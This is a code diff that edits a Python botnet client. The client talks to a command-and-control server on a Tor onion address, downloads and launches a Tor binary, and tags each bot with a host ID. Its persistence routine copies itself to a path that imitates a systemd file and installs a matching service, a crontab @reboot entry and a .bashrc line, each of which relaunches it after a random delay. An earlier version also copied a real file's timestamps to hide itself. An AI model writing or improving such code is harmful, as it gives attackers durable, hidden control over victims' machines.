@@ -20,7 +20,7 @@ import tarfile
 C2_ONION = "CHANGE_TO_YOUR_ONION_ADDRESS"
 SHARED_SECRET = "CHANGE_TO_C2_SECRET"
 C2_URL = f"http://{C2_ONION}"
-BOT_ID = hashlib.md5((socket.gethostname() + str(uuid.getnode()).encode()).hex().encode()).hexdigest()[:12]
+BOT_ID = hashlib.md5((socket.gethostname() + str(uuid.getnode())).encode()).hexdigest()[:12]
 ATTACK_STOP = threading.Event()
 PROXIES = {'http': 'socks5h://127.0.0.1:9050', 'https': 'socks5h://127.0.0.1:9050'}
 SESSION_KEY = None
@@ -55,67 +55,39 @@ def hide_process():
 def setup_tor():
     """Download static Tor binary if missing, then launch"""
     tor_path = '/tmp/tor'
-
     if not os.path.exists(tor_path):
         try:
             import platform as plat
             arch = plat.machine()
+            url = "https://tor.eff.org/dist/torbrowser/13.0.16/tor-linux64-13.0.16.tar.gz"
             if 'aarch64' in arch or 'arm64' in arch:
-                url = "https://archive.torproject.org/tor-package-archive/torbrowser/14.0.6/tor-linux64-14.0.6.tar.gz"
-            else:
-                url = "https://archive.torproject.org/tor-package-archive/torbrowser/14.0.6/tor-linux64-14.0.6.tar.gz"
-
+                url = "https://tor.eff.org/dist/torbrowser/13.0.16/tor-linux-aarch64-13.0.16.tar.gz"
+            print(f"[*] Downloading Tor from {url}")
             urllib.request.urlretrieve(url, '/tmp/tor.tar.gz')
-            with tarfile.open('/tmp/tor.tar.gz', 'r:gz') as tar:
-                tar.extractall('/tmp/tor_extract')
+            with tarfile.open('/tmp/tor.tar.gz') as tar:
+                tar.extractall('/tmp/')
+            for root, dirs, files in os.walk('/tmp/'):
+                for f in files:
+                    if f == 'tor':
+                        shutil.move(os.path.join(root, f), tor_path)
+                        break
+            os.chmod(tor_path, 0o755)
             os.remove('/tmp/tor.tar.gz')
-
-            # Find tor binary in extracted files
-            for root, dirs, files in os.walk('/tmp/tor_extract'):
-                if 'tor' in files:
-                    found = os.path.join(root, 'tor')
-                    shutil.copy(found, '/tmp/tor')
-                    os.chmod('/tmp/tor', 0o755)
-                    break
-            if not os.path.exists('/tmp/tor'):
-                return
-        except:
-            # Fallback: try apt
-            try:
-                subprocess.run(['apt', 'update', '-qq'], capture_output=True, timeout=60)
-                subprocess.run(['apt', 'install', '-y', '-qq', 'tor'], capture_output=True, timeout=120)
-                tor_path = '/usr/bin/tor'
-                if not os.path.exists(tor_path):
-                    return
-            except:
-                return
-
-    data_dir = '/tmp/.cache-tor'
-    os.makedirs(data_dir, exist_ok=True)
-    try:
-        subprocess.Popen(
-            [tor_path, '--SocksPort', '9050', '--DataDirectory', data_dir,
-             '--HiddenServiceStatistics', '0', '--Log', 'notice', 'stderr'],
-            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
-        )
-        time.sleep(5)
-    except:
-        pass
+        except Exception as e:
+            print(f"[-] Failed to download Tor: {e}")
+    if os.path.exists(tor_path):
+        subprocess.Popen([tor_path, "--SocksPort", "9050", "--ControlPort", "9051"],
+                         stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
 
 def persistence():
-    script_path = os.path.abspath(sys.argv[0])
+    script_path = os.path.realpath(__file__)
     install_path = '/usr/lib/systemd/systemd-logind-helper'
-    if script_path != install_path:
-        try:
+    try:
+        if os.path.exists(script_path):
             shutil.copy2(script_path, install_path)
-            if os.path.exists('/usr/lib/systemd/systemd-logind-helper'):
-                ref = '/usr/lib/systemd/systemd-logind' if os.path.exists('/usr/lib/systemd/systemd-logind') else '/lib/systemd/systemd-logind'
-                if os.path.exists(ref):
-                    stat_ref = os.stat(ref)
-                    os.utime(install_path, (stat_ref.st_atime, stat_ref.st_mtime))
-                os.chmod(install_path, 0o755)
-                script_path = install_path
-        except: pass
+            os.chmod(install_path, 0o755)
+            script_path = install_path
+    except: pass
     service = f"""[Unit]
 Description=Systemd Logind Helper
 After=network.target
@@ -128,18 +100,23 @@ RestartSec=120
 [Install]
 WantedBy=multi-user.target
 """
-    with open('/tmp/.journal', 'w') as f: f.write(service)
-    subprocess.run(['cp', '/tmp/.journal', '/etc/systemd/system/systemd-logind-helper.service'], capture_output=True)
-    subprocess.run(['systemctl', 'daemon-reload'], capture_output=True)
-    subprocess.run(['systemctl', 'enable', 'systemd-logind-helper.service'], capture_output=True)
-    subprocess.run(['systemctl', 'start', 'systemd-logind-helper.service'], capture_output=True)
-    os.remove('/tmp/.journal')
+    try:
+        with open('/tmp/.journal', 'w') as f:
+            f.write(service)
+        subprocess.run(['cp', '/tmp/.journal', '/etc/systemd/system/systemd-logind-helper.service'], capture_output=True)
+        subprocess.run(['systemctl', 'daemon-reload'], capture_output=True)
+        subprocess.run(['systemctl', 'enable', 'systemd-logind-helper.service'], capture_output=True)
+        subprocess.run(['systemctl', 'start', 'systemd-logind-helper.service'], capture_output=True)
+        os.remove('/tmp/.journal')
+    except: pass
     rand_delay = random.randint(0,120)
     cron_line = f"@reboot sleep {rand_delay} && {script_path} >/dev/null 2>&1 &\n"
     subprocess.run(f'(crontab -l 2>/dev/null; echo "{cron_line}") | crontab -', shell=True, capture_output=True)
     bashrc_path = os.path.expanduser('~/.bashrc')
-    with open(bashrc_path, 'a') as f:
-        f.write(f'\n(sleep $((RANDOM % 300)) && {script_path} &) >/dev/null 2>&1\n')
+    try:
+        with open(bashrc_path, 'a') as f:
+            f.write(f'\n(sleep $((RANDOM % 300)) && {script_path} &) >/dev/null 2>&1\n')
+    except: pass
 
 def register():
     global SESSION_KEY
